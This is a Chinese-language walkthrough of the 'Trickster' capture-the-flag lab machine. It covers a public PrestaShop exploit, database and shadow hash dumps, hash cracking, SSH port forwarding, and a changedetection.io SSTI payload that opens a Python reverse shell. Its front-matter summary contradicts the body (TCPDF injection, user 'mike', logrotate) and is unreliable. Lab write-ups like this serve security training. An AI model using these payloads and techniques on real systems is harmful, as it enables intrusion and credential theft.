---
title: Trickster-wp
date: '2024-09-22 00:00:00'
permalink: /post/tricksterwp-z2gjq8y.html
tagline: >-
  本文介绍了针对Trickster靶机的渗透测试过程。通过子域名枚举发现shop.trickster.htb，注册账户后找到PDF生成功能。利用TCPDF
  6.4.4的CVE-2024-34716漏洞进行PDF注入，成功获取服务器信息并建立反向Shell。进一步发现用户mike可通过sudo执行特定命令，最终利用logrotate提权获得root权限。整个过程涉及子域名发现、PDF注入、权限提升等多个攻击阶段。
tags:
  - pdf注入
  - tcpdf漏洞
  - 命令执行
  - web安全
  - 渗透测试
categories:
  - ' 网络安全'
  - 渗透测试
layout: post
published: true
---



# Trickster-wp

# Trickster

## enum

### nmap

```
nmap 10.10.11.34 -p80 -sC -sV -o details
Starting Nmap 7.94 ( https://nmap.org ) at 2024-09-22 00:09 EDT
Nmap scan report for 10.10.11.34
Host is up (0.63s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://trickster.htb/
Service Info: Host: _

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.92 seconds
```

### 子域名

![image-20240922121350339](/assets/images/image-20240922121350339-20250705113328-hg1ga78.png)

## shop.trickster.htb

注册个账号123@test.com:fsehfh8723nrf78!:2343289fs8:::

找到个pdf生成位置，下载pdf分析一下是否存在pdf注入

![image-20240922123227893](/assets/images/image-20240922123227893-20250705113328-j94d43r.png)

分析

```
exiftool personalData-2024-09-22.pdf 
ExifTool Version Number         : 12.76
File Name                       : personalData-2024-09-22.pdf
Directory                       : .
File Size                       : 471 kB
File Modification Date/Time     : 2024:09:22 00:21:09-04:00
File Access Date/Time           : 2024:09:22 00:21:11-04:00
File Inode Change Date/Time     : 2024:09:22 00:31:40-04:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
Linearized                      : No
PDF Version                     : 1.7
Page Count                      : 2
Page Layout                     : SinglePage
Page Mode                       : UseNone
XMP Toolkit                     : Adobe XMP Core 4.2.1-c043 52.372728, 2009/01/18-15:08:04
Format                          : application/pdf
Title                           : 
Creator                         : 
Description                     : 
Subject                         : 
Create Date                     : 2024:09:22 00:10:16-04:00
Creator Tool                    : 
Modify Date                     : 2024:09:22 00:10:16-04:00
Metadata Date                   : 2024:09:22 00:10:16-04:00
Keywords                        : 
Producer                        : TCPDF 6.4.4 (http://www.tcpdf.org)
Document ID                     : uuid:cc066234-8179-ab92-80c0-ccb5789a8e2a
Instance ID                     : uuid:cc066234-8179-ab92-80c0-ccb5789a8e2a
Schemas Namespace URI           : http://ns.adobe.com/pdf/1.3/
Schemas Prefix                  : pdf
Schemas Schema                  : Adobe PDF Schema
Schemas Property Category       : internal
Schemas Property Description    : Adobe PDF Schema
Schemas Property Name           : InstanceID
Schemas Property Value Type     : URI
Trapped                         : False
```

生成pdf的程序是tcpdf 6.4.4，我上网查了一下，这个版本的tcpdf没有什么能直接利用的漏洞，先留着，继续寻找其他漏洞

### [CVE-2024-34716](https://github.com/aelmokhtar/CVE-2024-34716)

我现在无法探测商店的具体版本，只能通过footer判断web应用是24年发行的，试了一圈，找到了这个似乎可行的漏洞，但是漏洞是xss到RCE，xss需要知道后台地址

![image-20240922134127206](/assets/images/image-20240922134127206-20250705113328-efnc3jc.png)

### 扫目录

![image-20240922133945113](/assets/images/image-20240922133945113-20250705113328-h16ib9p.png)

git泄露，直接利用GitHack下载网站源码，获取后台路径

![image-20240922134436872](/assets/images/image-20240922134436872-20250705113328-ssjlohw.png)

admin634ewutrx1jgitlooaj

修改一下payload，exploit.html、reverse_shell.php和exploit.py都要改

![image-20240922134929262](/assets/images/image-20240922134929262-20250705113328-s6v9klv.png)

### 排错

![image-20240922135104677](/assets/images/image-20240922135104677-20250705113328-bss7xp5.png)

![image-20240922135128544](/assets/images/image-20240922135128544-20250705113328-broxg3h.png)

可以看到exp执行后恶意主题确实被服务器下载了，但是我们并没有接收到shell，检查一下恶意主题

![image-20240922135234641](/assets/images/image-20240922135234641-20250705113328-f2p186j.png)

靠，里面的地址没改。那就是说reverse_shell.php白改了，要改压缩包里面的。修改后依然没有接收到shell，我猜测可能是因为主题名重复，修改一下主题名。找了一圈，发现是exploit.py中用于触发反弹shell的文件是reverse_shell.php

![image-20240922140736960](/assets/images/image-20240922140736960-20250705113328-t4c1ak8.png)

把这个文件加进压缩包后运行exp，成功得到shell

![image-20240922140810178](/assets/images/image-20240922140810178-20250705113328-no4q2u8.png)

## foot-holder

msf权限维持一下，然后打包网站源码进行分析

### enum

/etc/passwd

```
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
james:x:1000:1000:trickster:/home/james:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
adam:x:1002:1002::/home/adam:/bin/bash
dnsmasq:x:115:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
runner:x:1003:1003::/home/runner:/bin/sh
_laurel:x:998:998::/var/log/laurel:/bin/false
postfix:x:116:123::/var/spool/postfix:/usr/sbin/nologin
```

/home

![image-20240922141514120](/assets/images/image-20240922141514120-20250705113328-sxucwpd.png)

### 网站源码分析

找到数据库密码

```
'database_host' => '127.0.0.1',
    'database_port' => '',
    'database_name' => 'prestashop',
    'database_user' => 'ps_user',
    'database_password' => 'prest@shop_o',
```

### msyql

![image-20240922142701218](/assets/images/image-20240922142701218-20250705113328-clcnvgd.png)

```
+----------------------+--------------------------------------------------------------+
| email                | passwd                                                       |
+----------------------+--------------------------------------------------------------+
| 123@test.com         | $2y$10$akL4sn5T88bMdA9fFt0nVOGbt8AEA8/hMm8Lqy2kiMlSUh4mjME1W |
| adam@trickster.htb   | $2y$10$kY2G39RBz9P0S48EuSobuOJba/HgmQ7ZtajfZZ3plVLWnaBbS4gei |
| anonymous@psgdpr.com | $2y$10$054Mo38DcRSLaMX9OhT5UuhYSQvorGu8nZb9GubbAv3Roei6RS2QW |
| pub@prestashop.com   | $2y$10$Cw68h0u8YeP6IiYRRaOjQu4AV7X9BTQL3ZK4CtHU16PNDg7LB4mEG |
+----------------------+--------------------------------------------------------------+
```

数据库中可以找到adam的hash。

管理员hash位于ps_employee表中

```
MariaDB [prestashop]> select id_employee,id_profile,email,passwd from ps_employee;
select id_employee,id_profile,email,passwd from ps_employee;
+-------------+------------+---------------------+--------------------------------------------------------------+
| id_employee | id_profile | email               | passwd                                                       |
+-------------+------------+---------------------+--------------------------------------------------------------+
|           1 |          1 | admin@trickster.htb | $2y$10$P8wO3jruKKpvKRgWP6o7o.rojbDoABG9StPUt0dR7LIeK26RdlB/C |
|           2 |          2 | james@trickster.htb | $2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6yG5LyunCmm |
+-------------+------------+---------------------+--------------------------------------------------------------+
```

### hashcat

james的hash是可以破解的

```
$2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6yG5LyunCmm:alwaysandforever
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6y...yunCmm
Time.Started.....: Sun Sep 22 02:36:48 2024 (10 secs)
Time.Estimated...: Sun Sep 22 02:36:58 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     3872 H/s (3.30ms) @ Accel:4 Loops:16 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 37056/14344385 (0.26%)
Rejected.........: 0/37056 (0.00%)
Restore.Point....: 37040/14344385 (0.26%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-16
Candidate.Engine.: Device Generator
Candidates.#1....: alyssa7 -> Yankees
Hardware.Mon.#1..: Util: 78%

Started: Sun Sep 22 02:36:45 2024
Stopped: Sun Sep 22 02:36:59 2024
```

## root

### enum

#### suid

```
james@trickster:~$ find / -perm -u=s 2>/dev/null
/snap/core20/2379/usr/bin/chfn
/snap/core20/2379/usr/bin/chsh
/snap/core20/2379/usr/bin/gpasswd
/snap/core20/2379/usr/bin/mount
/snap/core20/2379/usr/bin/newgrp
/snap/core20/2379/usr/bin/passwd
/snap/core20/2379/usr/bin/su
/snap/core20/2379/usr/bin/sudo
/snap/core20/2379/usr/bin/umount
/snap/core20/2379/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2379/usr/lib/openssh/ssh-keysign
/snap/core20/2318/usr/bin/chfn
/snap/core20/2318/usr/bin/chsh
/snap/core20/2318/usr/bin/gpasswd
/snap/core20/2318/usr/bin/mount
/snap/core20/2318/usr/bin/newgrp
/snap/core20/2318/usr/bin/passwd
/snap/core20/2318/usr/bin/su
/snap/core20/2318/usr/bin/sudo
/snap/core20/2318/usr/bin/umount
/snap/core20/2318/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2318/usr/lib/openssh/ssh-keysign
/snap/snapd/21759/usr/lib/snapd/snap-confine
/usr/libexec/polkit-agent-helper-1
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/umount
/usr/bin/mount
/usr/bin/passwd
/usr/bin/su
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/opt/google/chrome/chrome-sandbox
```

#### ifconfig

```
james@trickster:~$ ifconfig
docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:ec:30:72:82  txqueuelen 0  (Ethernet)
        RX packets 215  bytes 12388 (12.3 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 39  bytes 1638 (1.6 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.11.34  netmask 255.255.254.0  broadcast 10.10.11.255
        ether 00:50:56:b9:bf:e6  txqueuelen 1000  (Ethernet)
        RX packets 400429  bytes 93593272 (93.5 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 390553  bytes 333289777 (333.2 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 2444142  bytes 3560001879 (3.5 GB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2444142  bytes 3560001879 (3.5 GB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

vethf5df75a: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        ether d2:01:a7:c1:bc:d9  txqueuelen 0  (Ethernet)
        RX packets 5  bytes 354 (354.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1  bytes 42 (42.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

存在docker环境，但是当前用户没有权限查看docker内容

![image-20240922144732284](/assets/images/image-20240922144732284-20250705113328-5pgawo5.png)

#### suggester

```
1   exploit/linux/local/cve_2022_0847_dirtypipe                         Yes                      The target appears to be vulnerable. Linux kernel version found: 5.15.0                                                                                                                         
 2   exploit/linux/local/cve_2022_0995_watch_queue                       Yes                      The target appears to be vulnerable.
 3   exploit/linux/local/su_login                                        Yes                      The target appears to be vulnerable.
```

一个都用不了

#### IP enum

```
use post/multi/gather/ping_sweep
set rhosts 172.17.0.1/24
set session 2
run
172.17.0.1
172.17.0.2
```

跑得太慢，直接fscan，fscan也是这个扫描结果，而且扫不到开启的端口。

#### linpeas

我自己枚举不到有用的信息，只能上大招了

![image-20240922221954636](/assets/images/image-20240922221954636-20250705113328-2zyex8i.png)

root用户运行的这个进程比较奇怪，用了相对路径，感觉有文件劫持的空间。

![image-20240922223203040](/assets/images/image-20240922223203040-20250705113328-zil9hf3.png)

127.0.0.1:39227这个套接字也运行了个服务，代理出来看看，访问后全是404，扫目录也扫不到东西。

#### 排错

看了hint，确实是docker的容器有问题，172.17.0.2上的端口我没扫全，要扫全端口，还是枚举得不够仔细

![image-20240922223807764](/assets/images/image-20240922223807764-20250705113328-4yaq1ax.png)

### docker

用ssh把端口转发出来

```
ssh -f -N -L 8080:172.17.0.2:5000 james@trickster.htb
james@trickster.htb's password:
```

![image-20240922223924700](/assets/images/image-20240922223924700-20250705113328-hsg2yt8.png)

是个开源项目，地址https://github.com/dgtlmoon/changedetection.io，右上角暴露了版本v0.45.20。exploit-db上有现成的exp https://www.exploit-db.com/exploits/52027。

利用james的密码可以登录。

#### CVE-2024-32651

![image-20240922224305789](/assets/images/image-20240922224305789-20250705113328-m97smbm.png)

这个exp是直接getshell，但是docker不出网，我们需要把端口远程转发出来，并且修改ip为靶机的ip 172.17.0.1。

```
ssh -f -N -R 0.0.0.0:4444:127.0.0.1:4444 james@trickster.htb
```

代理了也不管用，排查了一圈是这个exp的问题，于是尝试手工利用。

靶机开个http服务，

![image-20240922233036397](/assets/images/image-20240922233036397-20250705113328-1jnb4ry.png)

然后随便在网站目录下创建个index.html。接着回到控制台创建watch

![image-20240922233140954](/assets/images/image-20240922233140954-20250705113328-umf4gk9.png)

从exp中可以发现触发ssti的点位是notification_body

![image-20240922233234443](/assets/images/image-20240922233234443-20250705113328-5z01slc.png)

我们在notification body中加入payload，这个payload要修改一下格式。

```
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{ x()._module.__builtins__['__import__']('os').popen("python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"172.17.0.1\",5555));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'").read() }}{% endif %}{% endfor %}
```

同时记得设置Notification URL List，否则不会发送notification。

![image-20240922234356481](/assets/images/image-20240922234356481-20250705113328-0hafhky.png)

然后保存

![image-20240922233522609](/assets/images/image-20240922233522609-20250705113328-750l54q.png)

接着修改一下网站内容

![image-20240922233514599](/assets/images/image-20240922233514599-20250705113328-7nkkmys.png)

然后等检查后发送notification以触发payload，或者自己手动点击recheck

成功获取shell

![image-20240922234441917](/assets/images/image-20240922234441917-20250705113328-dtdd4dr.png)

#### .bash_history

泄露了密码

```
root@ae5c137aa8ef:~# cat .bash_history
cat .bash_history
apt update
#YouC4ntCatchMe# 					------------这里-----------
apt-get install libcap2-bin
capsh --print
clear
capsh --print
cd changedetectionio/
ls
nano forms.py 
apt install nano
nano forms.py 
exit
capsh --print
nano
cd changedetectionio/
nano forms.py 
exit
nano changedetectionio/flask_app.py 
exit
nano changedetectionio/flask_app.py 
exit
nano changedetectionio/flask_app.py 
nano changedetectionio/static/js/notifications.js 
exit
```

### root

口令复用登录root

![image-20240922234623828](/assets/images/image-20240922234623828-20250705113328-wf87at7.png)

## hash

```
root@trickster:~# cat /etc/shadow
root:$y$j9T$QrqZSRjwrjBfK8HexlK4d/$ng0E/9GWnWgXHLc1TSOBShK3ykz95fGBSVzzw6tiQl2:19968:0:99999:7:::
daemon:*:19405:0:99999:7:::
bin:*:19405:0:99999:7:::
sys:*:19405:0:99999:7:::
sync:*:19405:0:99999:7:::
games:*:19405:0:99999:7:::
man:*:19405:0:99999:7:::
lp:*:19405:0:99999:7:::
mail:*:19405:0:99999:7:::
news:*:19405:0:99999:7:::
uucp:*:19405:0:99999:7:::
proxy:*:19405:0:99999:7:::
www-data:*:19405:0:99999:7:::
backup:*:19405:0:99999:7:::
list:*:19405:0:99999:7:::
irc:*:19405:0:99999:7:::
gnats:*:19405:0:99999:7:::
nobody:*:19405:0:99999:7:::
_apt:*:19405:0:99999:7:::
systemd-network:*:19405:0:99999:7:::
systemd-resolve:*:19405:0:99999:7:::
messagebus:*:19405:0:99999:7:::
systemd-timesync:*:19405:0:99999:7:::
pollinate:*:19405:0:99999:7:::
sshd:*:19405:0:99999:7:::
syslog:*:19405:0:99999:7:::
uuidd:*:19405:0:99999:7:::
tcpdump:*:19405:0:99999:7:::
tss:*:19405:0:99999:7:::
landscape:*:19405:0:99999:7:::
fwupd-refresh:*:19405:0:99999:7:::
usbmux:*:19866:0:99999:7:::
james:$y$j9T$nFUssQJghJkY44BaQM2aD1$E9pJTfQ5CwEkaU/7O07HAh.4UsM1lOhKHqyRP1XEtL4:19868:0:99999:7:::
lxd:!:19866::::::
mysql:!:19866:0:99999:7:::
adam:$y$j9T$BUeIuw29kb15rDAz8ZXOt/$WG54Q2KcL9UI.zK0r2WaeXb6zUQioT1HBxJ0TfjF736:19868:0:99999:7:::
dnsmasq:*:19866:0:99999:7:::
runner:$y$j9T$1GBk1cQSxkwCXeThdrzvp.$.q2JbGTK0oFJG0aMtLjaVoRiv5419bO0gOC9mTJO2iB:19975:0:99999:7:::
_laurel:!:19979::::::
postfix:*:19983:0:99999:7:::
```
